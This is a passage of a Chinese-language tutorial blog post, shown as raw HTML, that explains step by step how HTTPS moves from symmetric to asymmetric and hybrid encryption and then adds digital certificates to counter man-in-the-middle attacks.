cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 02 06"\n        title=""\n        src="/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-fee1c.png"\n        srcset="/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-a67b7.png 200w,\n/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-0b187.png 400w,\n/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-fee1c.png 800w,\n/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-b1a91.png 1200w,\n/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-9e7f9.png 1416w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从上图可以看出，我们使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常我们把这种攻击方式称为中间人攻击</p>\n<p>具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。</p>\n<h2 id="在-http-协议栈中引入安全层"><a href="#%E5%9C%A8-http-%E5%8D%8F%E8%AE%AE%E6%A0%88%E4%B8%AD%E5%BC%95%E5%85%A5%E5%AE%89%E5%85%A8%E5%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>在 HTTP 协议栈中引入安全层</h2>\n<p>鉴于 HTTP 的明文传输使得传输过程毫无安全性可言，且制约了网上购物、在线转账等一系列场景应用，于是倒逼着我们要引入加密方案</p>\n<p>从 HTTP 协议栈层面来看，我们可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全层的数据都会被加密或者解密，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-0a2a7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 60.92124814264488%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB6UlEQVQoz5WS70sUQRjH738ryjfCyQV33XH5q6i7wqP89TJ6oWCIFGQdKboIercWm/omrDwiKEQRKfXQNFsUve30bm53dnZmd3Zn2nVXT30R9MAMAzOf5/s8831CvB6M/2eEGOM1zGqEaRZ3dxUz5zQJc+84lY/p08/WUAEOfqwOFIi4ajmGzmzbgzXs3M7D2KgSebYeHSml3uhV5PgwxZhXDn/sk8goiL7cjQytNWXLT94jG1QMeceDIWGdM3o6D+7njtJirXdOB4bj9+AQbCOkfl9ZiTV8a25aSIaXog0bjzuJDimoBMptU1pcAJHnxdhY5Z4IfWWvZG/xo+XF+fC1fPj6ROPV2cYrX3s6TGz4TXnKj97BtKimc+WUqPbMwkCZ8ZPm2bpix3OkZbIaf/3r5pTRVzDP/sOFnYwEXcE7wv5dEXbNXIL51h+akfRuCWQm9zISevEFnXnjKT+YVpvHD9uFgxah9FDSgMHOw0XFvjUB2oSD1rG9xHh54NMFmKfyIJHdSWZ/xoa3O96ql+ANhUVHlMSrrWR2+8bw7/4PRh12H7nebsrKplxSTaaRus9+mDY7Rrwol1fXdpUqqZH6OIX8LBZBlOB/DBM1sWVo3LEvTFjgSjBSwZlSik4DY3xiW1AqO1fXX1Jbc45hw79LAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 02 41"\n        title=""\n        src="/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-fee1c.png"\n        srcset="/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-a67b7.png 200w,\n/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-0b187.png 400w,\n/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-fee1c.png 800w,\n/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-b1a91.png 1200w,\n/static/2021-07-15-15-02-41-2b916e9c7ad937c69f038a5d93eee972-0a2a7.png 1346w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中我们可以看出 HTTPS 并非是一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是怎么工作的。</p>\n<p>总的来说，安全层有两个主要的职责：对发起 HTTP 请求的数据进行加密操作和对接收到 HTTP 的内容进行解密操作</p>\n<p>我们知道了安全层最重要的就是加解密，那么接下来我们就利用这个安全层，一步一步实现一个从简单到复杂的 HTTPS 协议。</p>\n<h3 id="第一版：使用对称加密"><a href="#%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第一版：使用对称加密</h3>\n<p>提到加密，最简单的方式是使用对称加密。所谓对称加密是指加密和解密都使用的是相同的密钥</p>\n<p>了解了对称加密，下面我们就使用对称加密来实现第一版的 HTTPS。</p>\n<p>要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 48.24868651488617%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB1ElEQVQoz1WRW2/aMBiG+fe9K1MLDceEwxI6TQX1ABurtLtxXkpbVVNb2rJBSJw4cUKCDSHBc8h20U+PXn22/NiyndjtKCsVedff7416DV58Vs+kqSTMPlWmovAm8pNKXq1LsHHavL5XdMgW72KH0kS4724eXxvnA6uaNaWiUc2BcgaUsyy1EseSTZqVbO2s//D8+k6OuylA55cjUMoYYnEucG+5o8nJ4YRLvnDJ34WUIfFsi3pzrFnOeznKEFP6pX0HBE4Xi8zXxQJzpvljKPGGFM2o/MnVt4dgr9L/lcCEbAheUdpqyotMUuPTWjGl5I+ePhw8Jg8WhWO1mAJ8WuEOL1q3PqUbQjDG2+02kg3DsJFpk+Br94877Hhy35N7rtxzhh1nFA8j3FG31Vdc4tvI0nV9tVpF8lxRFspcg077JTR9ihjbf9hBlJYfATe0+RxCx9UAmM1mCKFItizkea4f0myflEa4OnL5HmIIfXufzkcZizLmh6t0x6PYtU2oqhreV/xglMm5AancYPHnku9CvgeFnsl3zfIA1e7w6S2ujEnmhwvHYwcAFQATwuVyGf/zDvu0PQksHNrrnbOh9joibhAJYxq/grFOl+uAXRtjwo78C7Q9Afk8aQLAAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 03 34"\n        title=""\n        src="/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-fee1c.png"\n        srcset="/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-a67b7.png 200w,\n/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-0b187.png 400w,\n/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-fee1c.png 800w,\n/static/2021-07-15-15-03-34-c563f14e5039c47533af8f3aead3b625-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p>\n<ul>\n<li>浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。</li>\n<li>服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。</li>\n<li>最后浏览器和服务器分别返回确认消息。</li>\n</ul>\n<p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p>\n<p>通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p>\n<h3 id="第二版：使用非对称加密"><a href="#%E7%AC%AC%E4%BA%8C%E7%89%88%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第二版：使用非对称加密</h3>\n<p>不过非对称加密能够解决这个问题，因此接下来我们就利用非对称加密来实现我们第二版的 HTTPS，不过在讨论具体的实现之前，我们先看看什么是非对称加密。</p>\n<p>和对称加密只有一个密钥不同，非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密</p>\n<p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为公钥，服务器自己留下的那个密钥称为私钥。顾名思义，公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开。下图是使用非对称加密改造的 HTTPS 协议：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 51.83887915936953%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABs0lEQVQoz22N4U/aUBTF/eunH7aFqFixpbPQFgOYQUNImZFtWrLJRmHgNMr4YGkD7Wtppa8tnfjeHtUlbuHm5OScm/vL3cBk0MPl2D2ptEJJBFLZkUp2tagdHWpHnF7Mk+pIZbdSqNXV4dhcnSP8NBsrW8ZNdVjjPwT8nskzgKfNXGZ6SFncPsgfkAoExuGo45JyMbhJYPQCRg/fR5aUk/18ekpggdHZvdF+Sqd3TI6yeNoSGJujpEr7lwH++ZwkNIlwXTyBAmWKLBCzBLhjdrRsmuSVCizgqHpNDfBL9i+sB7jC1mb0mzGzaxAsk7p+++omtanT26Qa2V2Dei29/wrROtiAWJa7y1bjXmn6yun8/NT5KLufGiQnasKzhnw+go9rYGzMUfX20VlgzcdjovnKtcR1+CxyEPxOXv0HTyHaOouK/QXfW+Q6kP0yy114GcV+174Xf8QiWapRuh3HS7wGnvho83NU6kdCNxJ7Ub4D6ZbNfZuTTFQgGzXaVmDws7+Y6PbMtQHwPO8ZtiBKKUH1KiwPwuPLsNyHYsct9nySn1QahNlO3B16lhMYhg5sm1B/AIOj/hWSUYFSAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 04 25"\n        title=""\n        src="/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-fee1c.png"\n        srcset="/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-a67b7.png 200w,\n/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-0b187.png 400w,\n/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-fee1c.png 800w,\n/static/2021-07-15-15-04-25-b4e8e87d165b85fb73999f930c090795-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>根据该图，我们来分析下使用非对称加密的请求流程。</p>\n<ul>\n<li>首先浏览器还是发送加密套件列表给服务器。</li>\n<li>然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。</li>\n<li>最后就是浏览器和服务器返回确认消息。</li>\n</ul>\n<p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。</p>\n<ul>\n<li>第一个是非对称加密的效率太低。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li>\n<li>第二个是无法保证服务器发送给浏览器的数据安全。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li>\n</ul>\n<h3 id="第三版：对称加密和非对称加密搭配使用"><a href="#%E7%AC%AC%E4%B8%89%E7%89%88%EF%BC%9A%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%92%8C%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第三版：对称加密和非对称加密搭配使用</h3>\n<p>基于以上两点原因，我们最终选择了一个更加完美的方案，那就是在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输。下图就是改造后的版本：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 61.90893169877408%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACJUlEQVQoz12RW1PaQBSA+ftO1ZcIQZtAQEgFAYdxWi+dqjP2IlptR42JOLWiCbmw2cDKkmwSsl1Sa213vj17Xr45l83Q9GA8Bi6kUUwDn5LgJckf/CA0TZO+OJkkSdiDPHCo6F9bu2A1+1Be6a+mVFaMyopd5mFl2SlwO/uq2r35R2Z3ZtNYMf29YkPn5274xdv84o/84i0//5Bf0Pl5I7/QW5rb3L1EGNO02JPs+77tDB5H8MoKDqSmW+KM0nJf4vsl3pRyAynnSDlbyvYFbntfm1X6T9bv7x29d2HgTu1dsC54NWlULzKGtaK7VvDqEmqUoSzsHHRpaj/HDHumj4jGRLXJQXnDW80aImcWOKuwZBSzbISeyNmyoItLm+8VJkRRRMLwqfJkMhkAgJHHZv5YaY/l/EAWXVk0JZ4JoCqw3H0jOhK/9UH1wxACMOobs3pMRghp1139/ieTP61v4ZYEWlXYqli1giELoFlmOdyogrr0dk+LktmXRYQk02nadhgiy4oR1OzwqEd8n0BEho9khEOEI5bMGBMXBdvdCLrgStUUVWXNp3IcJ4TQJFTMgDuO2ze0ef2bpKnR1vWMppbISlL8HtEkBqaFAPj7z9N0f9ogenU4qZ6i159hoTMsdkYsil+geORVzrBwPM53MAVGYJuT4dDHmK0t87z8Oy8RTibtc7R24q6feY1vQ0b9FDLayrhxgWvnxOreOTawBo7neYSQX8KSawGla32yAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 05 26"\n        title=""\n        src="/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-fee1c.png"\n        srcset="/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-a67b7.png 200w,\n/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-0b187.png 400w,\n/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-fee1c.png 800w,\n/static/2021-07-15-15-05-26-1fea55093d6bd5a9e81e354e45338785-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从图中可以看出，改造后的流程是这样的：</p>\n<ul>\n<li>首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；</li>\n<li>服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li>\n<li>浏览器保存公钥，并利用 client-random 和 service-random 计算出来 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；</li>\n<li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。</li>\n</ul>\n<p>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成对称密钥，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。</p>\n<p>有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p>\n<p>需要特别注意的一点，pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了</p>\n<h3 id="第四版：添加数字证书"><a href="#%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%9A%E6%B7%BB%E5%8A%A0%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>第四版：添加数字证书</h3>\n<p>通过对称和非对称混合方式，我们完美地实现了数据的加密传输。不过这种方式依然存在着问题，比如我要打开极客时间的官网，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务器上实现公钥和私钥，而对浏览器来说，它完全不知道现在访问的是个黑客的站点。</p>\n<p>所以我们还需要服务器向浏览器提供证明“我就是我”，那怎么证明呢？</p>\n<p>这里我们结合实际生活中的一个例子，比如你要买房子，首先你需要给房管局提交你买房的材料，包括银行流水、银行证明、身份证等，然后房管局工作人员在验证无误后，会发给你一本盖了章的房产证，房产证上包含了你的名字、身份证号、房产地址、实际面积、公摊面积等信息。</p>\n<p>在这个例子中，你之所以能证明房子是你自己的，是因为引进了房管局这个权威机构，并通过这个权威机构给你颁发一个证书</p>\n<p>对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份，另一个是数字证书里面包含了服务器公钥。</p>\n<p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 71.62872154115587%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACfUlEQVQoz12S21PaQBSH+dP71gftTCkEtRBISApBdKzTTlv70jrWSxEsV8diNdxyAwm57m6u2wUc63TnNycnmf3y7eycRBzHGGPbMu4Vc3pzh7q/nG7LJek9BnabsNcKOg2lP+xLOnJtsn9NJdaPuSYfNaULpipTL+/SG2J6Y5DZJFWkXo2pTTmzqSdfHDPvv7Yle679g/FqxQG6FO2TvKDSySFNTQqZIZ1WC9Qsn5rSKTmXMvOvz0of6yMnhM/Mnufp+gJHXmMEfhQqc5aS2bcKu60Ud1R2W1tmi7yabOqk9OGPtQSjeG3ECdOyJFkx9VlNtBvlQ7CbX1Q5o1pcx6xy5h6n73KokjuvHt1aT9YVbFnWYDB4UCViJrBbyeklelGi9VWmfG7KZ+cVFgrZ890v/5txFAWGjkOvPgJnTHXBZRQ6TaIVKLWQGWTfiDtJhcuZReobd/jbIEgEIAzCcAmrijIajSx9djWG9XcHTjk7F5iFUCBChdkicrPCPJQLoLR9JnzqzULkGLOJhDQVB35CUdWbft9cwaf8gS7QisCoAjNkd26z6Qmf0wRGFlijnP0ufL6ehTiACKLA95bm0LGd6RT74Ery+jLAvhMDB0MHI4A9iKFL+oh8CdzmCHYVJI/FZrszkeXVkPh+7JHfBI0xqkuR68cLhA0Pk7oO6XWIQRAfD4JrFWF7IYmiD8DjkKxvr6kE1AXa60C2ZrCXBle3+IZFKun5hrPfRclTcG/EOEQRIdfHfoJbWpz+ifa6aAWbXN3mG3aRwDWTv3L2e176MrjvT7CuWgDatu267jNYjVLngJgrHe9ZEKlCG1XbgKr5Jy3tQZ5NV4uM5l9or80v9luQdQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 15 06 29"\n        title=""\n        src="/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-fee1c.png"\n        srcset="/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-a67b7.png 200w,\n/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-0b187.png 400w,\n/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-fee1c.png 800w,\n/static/2021-07-15-15-06-29-095c0e2c50c59400dc02cf3f710a4f96-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>相较于第三版的 HTTPS 协议，这里主要有两点改变：</p>\n<ul>\n<li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；</li>\n<li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li>\n</ul>\n<p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p>\n<h2 id="数字证书的申请和验证"><a href="#%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%B3%E8%AF%B7%E5%92%8C%E9%AA%8C%E8%AF%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数字证书的申请和验证</h2>\n<p>在第四版的 HTTPS 中，我们提到过，有了数字证书，黑客就无法欺骗用户了，不过我们并没有解释清楚如何通过数字证书来证明用户身份，所以接下来我们再来把这个问题解释清楚。</p>\n<h3 id="如何申请数字证书"><a href="#%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 